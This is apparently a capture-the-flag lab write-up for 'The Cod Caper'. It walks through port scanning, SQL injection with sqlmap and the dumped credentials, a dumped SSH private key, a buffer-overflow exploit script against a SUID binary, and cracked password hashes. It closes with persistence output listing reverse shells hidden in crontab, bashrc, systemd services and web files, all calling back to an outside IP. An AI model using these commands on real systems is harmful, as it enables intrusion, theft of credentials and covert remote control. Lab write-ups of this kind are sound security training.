# The Cod Caper

## Preparation

Added IP to /etc/hosts as cod.hack

## Recon

Prompts says this is Linux.

Using nmap to identify all ports.
```
nmap -v -r -p- -T4 -oA recon/nmap/allports cod.hack
...
Discovered open port 22/tcp on 10.10.187.200
Discovered open port 80/tcp on 10.10.187.200
...
22/tcp open  ssh
80/tcp open  http
```

Fingerprinting discovered services
```
nmap -v -sV -sC -p 22,80 -oA recon/nmap/fingerprinting-ssh-http cod.hack
...
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### 80/TCP

Apache2 default landing page.

Interesting HTML comment:
```
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
```

That bug is the following: "The apache default page in trusty is debian branded (attached). It says "Apache2 Debian Default Page" and has the Debian logo. That's misleading, since this is ubuntu, not debian."

Running Gobuster
```
gobuster dir -u http://cod.hack/ -w /usr/share/seclists/Discovery/Web-Content/apache.txt -o recon/gobuster/root-apache.txt 2> recon/gobuster/root-apache.err
...
/.htaccess (Status: 403)                                  
/index.html (Status: 200)
/server-status (Status: 403)
/.htpasswd (Status: 403)  
```
```
gobuster dir -u http://cod.hack/ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -o recon/gobuster/root-apache-fuzz.txt 2> recon/gobuster/root-apache-fuzz.err
...
//.htaccess.bak (Status: 403)
//.htaccess (Status: 403)
//.htpasswd (Status: 403)
//index.html (Status: 200)
//server-status (Status: 403)
```

Checking Gobuster errors (none exist)
```
for i in $(cat recon/gobuster/*err | strings | grep --color=never ERROR | awk -F' ' '{print $6}' | sed 's/.$//g'); do curl -I $i; done;
```

Another HTML comment:
```
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```

Enumerating service version by causing an error: Apache/2.4.18

Tried a few LFI exploits from exploit DB, nothing.

Trying bigger wordlist with gobuster.
```
gobuster dir -u http://cod.hack/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,py,sh,pl -o recon/gobuster/root-big.txt 2> recon/gobuster/root-big.err
```

Found http://cod.hack/administrator.php. Basic login page, cannot enumerate usernames, trying simple credentials and SQL injection.

Intercepted request with BurpSuite
```
sqlmap --batch --users --passwords --privileges --roles -r login.request
```

Output log in /home/monty/.sqlmap/output/cod.hack
```
back-end DBMS: MySQL >= 5.0
database management system users [4]:
[*] 'debian-sys-maint'@'localhost'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
    clear-text password: root
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: *82D1BDA2F1E16E0DAEE2412F1C6E8DE7DF8B84FD

```

Last hash not recovered with rockyou.txt.


## Cracking the Perimeter

Re-ran the following:
```
sqlmap -u http://cod.hack/administrator.php --forms --dump
...
Parameter: username (POST)                                
    Type: boolean-based blind           
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause                              
    Payload: username=monty' RLIKE (SELECT (CASE WHEN (9148=9148) THEN 0x6d6f6e7479 ELSE 0x28 END))-- MorP&password=m
ontysecurity                                              
                                                          
    Type: error-based                                                                                                
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                          
    Payload: username=monty' OR (SELECT 6794 FROM(SELECT COUNT(*),CONCAT(0x717a707671,(SELECT (ELT(6794=6794,1))),0x7
171626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- lzyf&password=montysecurity             
                                                          
    Type: time-based blind   
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                        
    Payload: username=monty' AND (SELECT 3762 FROM (SELECT(SLEEP(5)))NoPQ)-- IYze&password=montysecurity             
...
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+

[19:42:13] [INFO] table 'users.users' dumped to CSV file '/home/monty/.sqlmap/output/cod.hack/dump/users/users.csv'
```

If you login to /administrator.php with those credentials you are presented with a prompt to run commands. Downloading and running linper for port 5253. It did not work, just using shellclip to make one in bash and running that.

Got a shell that way as www-data.

## Persistence

Configured linper on 5253.

## Privilege Escalation

Found readable rsa (ssh) file for pingu
```
www-data@ubuntu:/dev/shm$ cat /home/pingu/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----
```

The SSH does not work. Found a hidden password in /var/hidden/pass: pinguapingu

Swiched user to pingu. 

Cannot sudo, interesting SUID file found
```
pingu@ubuntu:~$ ls -lh /opt/secret/root
-r-sr-xr-x 1 root papa 7.4K Jan 16 21:07 /opt/secret/root
```

We can overwrite EIP after 44 characters.

Converting Hex to LE

0x080484cb
/xcb/x84/x04/x08

Making payload.
```
monty@localhost:~/ctfs/thm/the-cod-caper$ python -c "print(str('A'*44 + '/xcb/x84/x04/x08'))"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/xcb/x84/x04/x08
```

Could not get it to work with echo so I ran the following on the machine to exploit it:
```
pingu@ubuntu:/opt/secret$ python -c "print(str('A'*44 + '\xcb\x84\x04\x08'))" | ./root
...
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
...
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
```

Also exploited it with pwn tools
```
#!/usr/bin/python

from pwn import *

proc = process("/opt/secret/root")
elf = ELF("/opt/secret/root")
shell_func = elf.symbols.shell
payload = fit({ 44: shell_func })
proc.sendline(payload)
proc.interactive()
```

$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:postman
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish

Got root with "love2fish"

## Configuring Persistence

Configured linper on 5253

```
[+] Bash reverse shell loaded in crontab                  
[+] Python reverse shell loaded in crontab                
[+] Python3 reverse shell loaded in crontab                                                                          
[+] Netcat reverse shell loaded in crontab                
[+] Bash reverse shell loaded in root's bashrc
[+] Python reverse shell loaded in root's bashrc          
[+] Python3 reverse shell loaded in root's bashrc         
[+] Netcat reverse shell loaded in root's bashrc
[+] Bash reverse shell installed as a service at /etc/systemd/system/.IJiqS5NyxY.service
[+] Python reverse shell installed as a service at /etc/systemd/system/.IJkJpelV9v.service
[+] Python3 reverse shell installed as a service at /etc/systemd/system/.EcPVhM7nnr.service
[+] Netcat reverse shell installed as a service at /etc/systemd/system/.moZEAdmDHm.service
[+] PHP reverse shell placed in /var/www/.2efLmfqWTF.php
[+] PHP reverse shell placed in /var/www/html/.Hh9q2kl5Gt.php
...

[+] All shells call back to 10.2.14.14:5253
```